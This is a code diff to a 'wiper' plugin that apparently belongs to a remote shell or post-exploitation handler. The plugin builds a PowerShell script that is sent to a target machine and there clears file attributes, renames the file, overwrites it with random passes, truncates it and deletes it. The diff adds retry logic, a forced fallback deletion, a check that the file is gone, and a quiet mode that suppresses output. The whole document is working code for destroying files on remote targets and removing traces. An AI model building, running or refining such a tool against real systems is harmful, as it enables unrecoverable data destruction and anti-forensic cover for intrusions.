@@ -238,17 +238,36 @@ $path='{escaped}'
 $profile='{method}'
 $result=@{{path=$path;platform='windows';profile=$profile}}
 $steps=@()
+$originalPath=$path
+function Clear-FileAttributes([string]$p) {{
+  try {{ [IO.File]::SetAttributes($p,[IO.FileAttributes]::Normal) }} catch {{}}
+  try {{
+    $i=Get-Item -LiteralPath $p -Force -EA Stop
+    $i.Attributes=[IO.FileAttributes]::Normal
+  }} catch {{}}
+}}
+function Flush-ToDisk([IO.FileStream]$stream) {{
+  try {{ $stream.Flush($true) }} catch {{ $stream.Flush() }}
+}}
+function Open-WriteRetry([string]$p,[int]$retries=6) {{
+  for ($try=0; $try -lt $retries; $try++) {{
+    try {{
+      return [IO.File]::Open($p,[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite,[IO.FileShare]::None)
+    }} catch {{
+      if ($try -ge ($retries - 1)) {{ throw }}
+      Start-Sleep -Milliseconds 350
+    }}
+  }}
+}}
 try {{
   if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {{
     throw 'File not found or not a regular file'
   }}
   $originalPath=$path
+  Clear-FileAttributes $path
+  $steps+='attributes_cleared'
   $item=Get-Item -LiteralPath $path -Force
   $size=$item.Length
-  try {{
-    $item.Attributes=[IO.FileAttributes]::Normal
-    $steps+='attributes_cleared'
-  }} catch {{}}
 
   $parent=Split-Path -Parent $path
   if ([string]::IsNullOrEmpty($parent)) {{ $parent='.' }}
@@ -260,7 +279,8 @@ try {{
     $steps+='renamed'
   }} catch {{}}
 
-  $fs=[IO.File]::Open($path,[IO.FileMode]::Open,[IO.FileAccess]::Write,[IO.FileShare]::None)
+  Clear-FileAttributes $path
+  $fs=Open-WriteRetry $path
   $buf=New-Object byte[] 65536
   $rng=[System.Security.Cryptography.RandomNumberGenerator]::Create()
   $passList=@({ps_passes})
@@ -278,12 +298,13 @@ try {{
       $fs.Write($buf,0,$n)|Out-Null
       $remaining-=$n
     }}
-    $fs.Flush($true)
+    Flush-ToDisk $fs
   }}
   $steps+='overwrite'
   $fs.SetLength(0)|Out-Null
-  $fs.Flush($true)
+  Flush-ToDisk $fs
   $fs.Close()
+  $fs=$null
   $steps+='truncated'
   [IO.File]::Delete($path)
   $steps+='unlinked'
@@ -293,10 +314,31 @@ try {{
   $result.method='{label.replace("'", "''")}'
   $result.steps=$steps
   $result.verified=-not (Test-Path -LiteralPath $path)
+  if (-not $result.verified) {{
+    throw 'File still present after secure delete'
+  }}
   $result.message='Secure wipe complete; file deleted'
 }} catch {{
   $result.error=$_.Exception.Message
-  if ($result.steps) {{ $result.steps=$steps }}
+  $result.steps=$steps
+  foreach ($target in @($path,$originalPath)) {{
+    if ([string]::IsNullOrEmpty($target)) {{ continue }}
+    if (-not (Test-Path -LiteralPath $target -PathType Leaf)) {{ continue }}
+    try {{
+      Clear-FileAttributes $target
+      Remove-Item -LiteralPath $target -Force -EA Stop
+      $steps+='fallback_delete'
+      $result.steps=$steps
+      $result.verified=-not (Test-Path -LiteralPath $target)
+      if ($result.verified) {{
+        $result.error=$null
+        $result.message='File deleted via fallback Remove-Item (overwrite may be incomplete)'
+      }}
+      break
+    }} catch {{
+      $result.fallback_error=$_.Exception.Message
+    }}
+  }}
 }}
 Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
 """
@@ -316,15 +358,17 @@ _METHOD_TIMEOUTS = {
     platforms=['linux', 'windows', 'unix'],
     description='Securely wipe a remote file (multi-pass overwrite, rename, truncate, delete)',
 )
-def run(session: SessionContext, args):
+def run(session: SessionContext, args, quiet=False, return_result=False):
     remote_path, method, usage = _parse_wiper_args(args)
     if usage:
-        session.print(usage, 'yellow')
-        return 1
+        if not quiet:
+            session.print(usage, 'yellow')
+        return (1, None) if return_result else 1
 
     session.log_event(f'Plugin wiper: {method} wipe for {remote_path}')
-    session.print(_SSD_CAVEAT, 'yellow')
-    session._handler._flush_shell(session._client_sock, timeout=1.0)
+    if not quiet:
+        session.print(_SSD_CAVEAT, 'yellow')
+    session._handler._flush_shell(session._client_sock, timeout=3.0 if quiet else 1.0)
 
     if session.is_windows:
         win_ps = _build_windows_wiper(remote_path, method)
@@ -343,25 +387,33 @@ def run(session: SessionContext, args):
     )
 
     if raw is None:
-        session.print("Plugin 'wiper' failed — no response from target.", 'red')
+        if not quiet:
+            session.print("Plugin 'wiper' failed — no response from target.", 'red')
         session.log_plugin_result('wiper', '', f'no response for {remote_path}')
-        return 1
+        return (1, None) if return_result else 1
 
     data = parse_collector_json(raw)
     if not data:
-        session.print("Plugin 'wiper' failed — could not parse results.", 'red')
+        if not quiet:
+            session.print("Plugin 'wiper' failed — could not parse results.", 'red')
+            session.print(f'Raw snippet: {raw[:500]}', 'yellow')
         session.log_plugin_result('wiper', raw[:4000], 'parse error')
-        return 1
+        return (1, None) if return_result else 1
 
     if data.get('error'):
-        session.print(f"Plugin 'wiper' error: {data['error']}", 'red')
+        if not quiet:
+            session.print(f"Plugin 'wiper' error: {data['error']}", 'red')
+            if data.get('fallback_error'):
+                session.print(f"Fallback delete error: {data['fallback_error']}", 'red')
         report = format_wiper_report(data)
-        session.print(report, 'cyan')
+        if not quiet:
+            session.print(report, 'cyan')
         session.log_plugin_result('wiper', report, json.dumps(data, indent=2))
-        return 1
+        return (1, data) if return_result else 1
 
     report = format_wiper_report(data)
-    session.print(report, 'cyan')
+    if not quiet:
+        session.print(report, 'cyan')
     session.log_plugin_result('wiper', report, json.dumps(data, indent=2))
     session.log_command(f'run wiper {remote_path} method={method}', report)
-    return 0
+    return (0, data) if return_result else 0
